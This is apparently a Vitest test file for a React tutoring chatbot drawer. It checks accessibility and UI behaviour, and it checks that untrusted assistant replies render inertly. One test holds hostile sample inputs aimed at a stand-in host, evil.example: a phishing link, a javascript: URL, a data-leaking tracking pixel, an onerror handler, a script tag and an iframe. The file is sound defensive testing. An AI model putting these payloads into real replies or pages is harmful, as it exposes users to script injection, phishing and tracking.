// @vitest-environment jsdom
import { act } from "react";
import { createRoot } from "react-dom/client";
import type { Root } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { LIMITS } from "../services/groqService";
import { useChatStore } from "../store/useChatStore";
import ChatbotDrawer from "./ChatbotDrawer";

(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
Element.prototype.scrollIntoView = vi.fn();
vi.mock("../services/groqService", async (importOriginal) => ({ ...(await importOriginal<typeof import("../services/groqService")>()), askGroq: vi.fn() }));

let container: HTMLDivElement;
let root: Root;
const q = <T extends Element>(selector: string) => container.querySelector<T>(selector);
const open = () => act(() => { useChatStore.getState().openChat(); });
const seed = (messages: { role: "user" | "assistant"; content: string }[]) =>
  act(() => { useChatStore.setState({ messages: messages.map((m, i) => ({ id: i + 1, ...m })) }); });

beforeEach(() => {
  act(() => { useChatStore.getState().clearChat(); useChatStore.setState({ isOpen: false, hasOpened: false, error: null }); });
  container = document.createElement("div");
  document.body.appendChild(container);
  root = createRoot(container);
  act(() => root.render(<ChatbotDrawer />));
});
afterEach(() => { act(() => root.unmount()); container.remove(); });

describe("untrusted replies cannot do harm", () => {
  it("renders hostile Markdown and HTML as inert text: no images, links, scripts, handlers or remote loads", () => {
    open();
    seed([
      { role: "user", content: "hi" },
      { role: "assistant", content: [
        "Click [the docs](https://evil.example/phish) or [here](javascript:alert(1)).",
        "![tracking pixel](https://evil.example/pixel.png?data=GRAMMAR)",
        '<img src="x" onerror="alert(2)"> <script>alert(3)</script> <a href="https://evil.example">raw</a>',
        "<iframe src=\"https://evil.example\"></iframe>",
        "**Bold** is fine, and so is `code`.",
      ].join("\n\n") },
    ]);
    const bubble = q(".chat-message-assistant .chat-message-bubble")!;
    expect(bubble.querySelectorAll("img, a, script, iframe, object, embed, form, style, link").length).toBe(0);
    expect(bubble.innerHTML.toLowerCase()).not.toContain("onerror");
    expect(bubble.innerHTML.toLowerCase()).not.toContain("javascript:");
    expect(bubble.innerHTML).not.toContain("evil.example/pixel");
    expect(bubble.textContent).toContain("the docs"); // the words survive
    expect(bubble.querySelector("strong")?.textContent).toBe("Bold");
    expect(bubble.querySelector("code")?.textContent).toBe("code");
  });

  it("shows the learner's own message as plain text, never as Markdown or HTML", () => {
    open();
    seed([{ role: "user", content: "<b>not bold</b> **nor this**" }]);
    const bubble = q(".chat-message-user .chat-message-bubble")!;
    expect(bubble.querySelector("b, strong")).toBeNull();
    expect(bubble.textContent).toBe("<b>not bold</b> **nor this**");
  });
});

describe("behaviour", () => {
  it("is a valid modal dialog: not an <aside>, labelled, with focus placed in the message box", () => {
    open();
    const dialog = q<HTMLElement>("[role=dialog]")!;
    expect(dialog.tagName).toBe("DIV");
    expect(dialog.getAttribute("aria-modal")).toBe("true");
    expect(document.activeElement).toBe(q("textarea"));
  });

  it("closes on Escape and gives focus back to what opened it", () => {
    const opener = document.createElement("button");
    document.body.appendChild(opener);
    opener.focus();
    open();
    act(() => { q("textarea")!.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true })); });
    expect(useChatStore.getState().isOpen).toBe(false);
    expect(document.activeElement).toBe(opener);
    opener.remove();
  });

  it("keeps Tab inside the dialog", () => {
    open();
    seed([{ role: "user", content: "hi" }]);
    act(() => { q<HTMLTextAreaElement>("textarea")!.value = "x"; });
    const focusable = [...container.querySelectorAll<HTMLElement>("[role=dialog] button, [role=dialog] textarea")].filter((e) => !e.hasAttribute("disabled"));
    const last = focusable[focusable.length - 1];
    last.focus();
    const event = new KeyboardEvent("keydown", { key: "Tab", bubbles: true, cancelable: true });
    act(() => { last.dispatchEvent(event); });
    expect(event.defaultPrevented).toBe(true);
    expect(document.activeElement).toBe(focusable[0]);
  });

  it("limits the question length, tells the learner their data goes to Groq, and warns that answers can be wrong", () => {
    open();
    expect(q<HTMLTextAreaElement>("textarea")!.maxLength).toBe(LIMITS.prompt);
    expect(container.textContent).toContain("are sent to Google Groq");
    expect(container.textContent).toContain("can contain mistakes");
  });

  it("shows typing dots only while waiting for the first word, then the growing answer instead", () => {
    open();
    seed([{ role: "user", content: "hi" }]);
    act(() => { useChatStore.setState({ isLoading: true }); });
    expect(q("[aria-label='SLR Tutor is typing']")).not.toBeNull();
    seed([{ role: "user", content: "hi" }, { role: "assistant", content: "Starting" }]);
    expect(q("[aria-label='SLR Tutor is typing']")).toBeNull();
    expect(container.textContent).toContain("Starting");
    expect(q("[role=log]")?.getAttribute("aria-busy")).toBe("true");
  });

  it("shows errors in an alert and disables Send while a request runs", () => {
    open();
    act(() => { useChatStore.setState({ error: "The API key was rejected." }); });
    expect(q("[role=alert]")?.textContent).toBe("The API key was rejected.");
    act(() => { useChatStore.setState({ isLoading: true }); });
    expect(q<HTMLButtonElement>(".chatbot-send")!.disabled).toBe(true);
  });
});
